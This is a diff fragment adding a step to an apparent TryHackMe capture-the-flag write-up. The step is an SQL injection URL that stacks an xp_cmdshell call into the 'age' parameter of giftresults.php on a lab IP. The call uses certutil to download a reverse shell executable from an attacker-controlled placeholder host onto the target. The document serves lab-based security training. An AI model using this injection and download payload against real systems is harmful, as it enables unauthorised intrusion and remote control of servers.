@@ -62,6 +62,10 @@ python3 -m http.server 8000
 
 Then we will put this reverse shell into the victim machine using the xp_cmdshell command 
 
+```
+http://10.10.82.81/giftresults.php?age='; EXEC xp_cmdshell 'certutil -urlcache -f http://YOUR.IP.ADDRESS.HERE:8000/reverse.exe C:\Windows\Temp\reverse.exe'; --
+```
+
 ![image](https://github.com/kyou00/tryhackme-writeups/assets/92074685/49693447-2836-46b7-879f-dd781b2ac6ab)
 
 ![image](https://github.com/kyou00/tryhackme-writeups/assets/92074685/7ef21343-bd57-48f0-b382-85103c5d6fba)
